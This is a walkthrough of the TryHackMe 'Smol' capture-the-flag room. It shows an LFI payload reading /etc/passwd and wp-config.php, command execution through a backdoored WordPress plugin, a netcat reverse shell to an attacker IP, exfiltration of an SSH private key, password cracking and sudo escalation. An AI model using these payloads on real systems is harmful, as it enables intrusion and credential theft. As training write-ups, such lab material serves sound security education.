<div align="center">

# 🏴 Smol — TryHackMe
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-green?style=for-the-badge)
![Status](https://img.shields.io/badge/Status-Completed-brightgreen?style=for-the-badge)
![Platform](https://img.shields.io/badge/Platform-TryHackMe-212C42?style=for-the-badge&logo=tryhackme)

</div>


# Smol — TryHackMe Walkthrough

A full walkthrough of the **Smol** room on TryHackMe: WordPress plugin LFI → credential leak → admin panel takeover → backdoor RCE → lateral movement across multiple users → root.

> **Difficulty:** Medium
> **Skills covered:** Nmap, Gobuster, LFI (CVE-2018-20463), WordPress exploitation, reverse shells, hash cracking (John the Ripper), zip cracking, SSH pivoting, privilege escalation

---

## Table of Contents

- [Recon](#recon)
- [Enumeration](#enumeration)
- [Exploiting the jsmol2wp Plugin (LFI)](#exploiting-the-jsmol2wp-plugin-lfi)
- [Getting WordPress Credentials](#getting-wordpress-credentials)
- [Admin Panel Access & Backdoor RCE](#admin-panel-access--backdoor-rce)
- [Getting a Reverse Shell](#getting-a-reverse-shell)
- [Lateral Movement: diego](#lateral-movement-diego)
- [User Flag](#user-flag)
- [Lateral Movement: think → gege → xavi](#lateral-movement-think--gege--xavi)
- [Privilege Escalation to Root](#privilege-escalation-to-root)
- [Root Flag](#root-flag)
- [Summary of Attack Chain](#summary-of-attack-chain)

---

## Recon

Started with an Nmap scan against the target:

```bash
nmap -sC -sV -oN nmap_smol.txt <TARGET_IP>
```

Two open ports were found:

| Port | Service |
|------|---------|
| 22   | SSH     |
| 80   | HTTP    |

Since the web server responded with a virtual host, the domain was added to `/etc/hosts`:

```bash
echo "<TARGET_IP> www.smol.thm" | sudo tee -a /etc/hosts
```

<img width="1004" height="580" alt="image" src="https://github.com/user-attachments/assets/4b6b89fb-92e8-4081-a5bb-5ad5e42b9159" />


## Enumeration

Ran Gobuster against the web server to enumerate directories and files:

```bash
gobuster dir -u http://www.smol.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

<img width="1004" height="574" alt="image" src="https://github.com/user-attachments/assets/82244945-75a2-4427-886c-4c21f00df887" />


This revealed a WordPress installation along with several plugin directories — including one called **jsmol2wp**.

## Exploiting the jsmol2wp Plugin (LFI)

The `jsmol2wp` plugin readme confirmed the version in use:

```
http://www.smol.thm/wp-content/plugins/jsmol2wp/readme.txt
```

This version is vulnerable to **CVE-2018-20463**, a Local File Inclusion (LFI) bug that allows reading arbitrary files on the server through the `query` parameter.

**Test with `/etc/passwd`:**

```
http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../etc/passwd
```

That confirmed the vulnerability but didn't yield anything immediately useful, so the next target was WordPress's own config file.

## Getting WordPress Credentials

**Read `wp-config.php` via the same LFI:**

```
http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php
```

This leaked the database credentials:

```
Database name: wordpress
Database user: wpuser
Database password: kbLSF2Vop#lw3rjDZ629*Z%G
Host: localhost
```

## Admin Panel Access & Backdoor RCE

The leaked credentials worked for the **WordPress admin dashboard** (`/wp-login.php`), giving full admin access.

An initial attempt to trigger a known backdoor in the **Hello Dolly** plugin failed:

<img width="1004" height="491" alt="image" src="https://github.com/user-attachments/assets/f284aaca-9d04-42fe-abb2-f96fbe784923" />


```
http://www.smol.thm/wp-content/plugins/hello.php?pass=[somepassword]&cmd=id
```

This didn't work because the room's modified version of Hello Dolly doesn't use a `pass` parameter — it executes commands from **any authenticated admin page** via a `cmd` GET parameter.

**Working payload (from an authenticated session):**

```
http://www.smol.thm/wp-admin/index.php?cmd=id
```

Response confirmed code execution:

```
uid=33(www-data) gid=33(www-data)
```

## Getting a Reverse Shell

Started a listener on the attack machine:

```bash
nc -lvnp 9001
```

Triggered a reverse shell using the same backdoor parameter:

```
http://www.smol.thm/wp-admin/index.php?cmd=busybox nc <YOUR_ATTACK_IP> 9001 -e sh
```

Shell caught as `www-data`:

```
www-data@ip-10-112-151-52:/home$
```

## Lateral Movement: diego

Attempting to browse into another user's home directory failed due to permissions:

```bash
cd diego
# bash: cd: diego: Permission denied
```

A password hash for `diego` was located and exfiltrated to the attack machine for cracking:

```bash
echo '$P$Bsomediegohashhere' > /tmp/diego.hash
cat /tmp/diego.hash | base64
```

**Crack it with John the Ripper:**

```bash
john diego.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

Recovered password:

```
sandiegocalifornia
```

<img width="694" height="190" alt="image" src="https://github.com/user-attachments/assets/fadd07ab-1eef-4465-910e-5a710cd93bb1" />


## User Flag

Switching to `diego` gave access to the user flag:

```
user.txt: 
```

## Lateral Movement: think → gege → xavi

An SSH private key belonging to another user (`think`) was found. It was exfiltrated and used to pivot:

```bash
cat /home/think/.ssh/id_rsa | base64
```

On the attack machine:

```bash
echo -n 'PASTE_BASE64_HERE' | base64 -d > think_id_rsa
chmod 600 think_id_rsa
ssh -i think_id_rsa think@<TARGET_IP>
```

<img width="934" height="344" alt="image" src="https://github.com/user-attachments/assets/665c64d5-ee63-495e-b7e7-642767a74c38" />


From `think`, switched to user `gege`, where a `wordpress.old.zip` backup was found. It was exfiltrated in base64 chunks (the payload was too large for a single copy-paste, so a small Python HTTP server was used to transfer it instead):

```bash
base64 /home/gege/wordpress.old.zip > /tmp/zip.b64
```

<img width="1004" height="373" alt="image" src="https://github.com/user-attachments/assets/ab6e4327-d8cf-4c3d-86b6-d054347b9f95" />



The zip was **password-protected**, so it was cracked using `zip2john` + John the Ripper:

```bash
zip2john wordpress.old.zip > zip.hash
john zip.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

Unzipping the archive with the cracked password revealed credentials for user `xavi`:

<img width="1004" height="136" alt="image" src="https://github.com/user-attachments/assets/dba40aa0-e774-4ad4-81a8-f3e7a26fa10a" />


```
P@ssw0rdxavi@
```

<img width="756" height="241" alt="image" src="https://github.com/user-attachments/assets/5b822a3d-bb93-48d1-85be-5f2b2c736b0f" />



## Privilege Escalation to Root

Logged in as `xavi` and checked `sudo` privileges:

```bash
sudo -l
sudo su -
```

`xavi` had sufficient sudo rights to escalate directly to root.

## Root Flag

<img width="1004" height="796" alt="image" src="https://github.com/user-attachments/assets/6b4c4936-3308-4271-a5b8-feb730e7dbe4" />


```
root.txt:
```

## Summary of Attack Chain

```
Nmap/Gobuster recon
        │
        ▼
LFI in jsmol2wp plugin (CVE-2018-20463)
        │
        ▼
Read wp-config.php → DB credentials
        │
        ▼
WordPress admin login
        │
        ▼
RCE via modified Hello Dolly plugin backdoor (?cmd=)
        │
        ▼
Reverse shell as www-data
        │
        ▼
Cracked diego's password hash → user.txt
        │
        ▼
Pivot via think's SSH key → gege → cracked wordpress.old.zip → xavi's password
        │
        ▼
sudo su - as xavi → root.txt
```

---

### Disclaimer

This walkthrough is for educational purposes only, documenting a deliberately vulnerable machine on TryHackMe. Do not use these techniques against systems you do not own or have explicit permission to test.
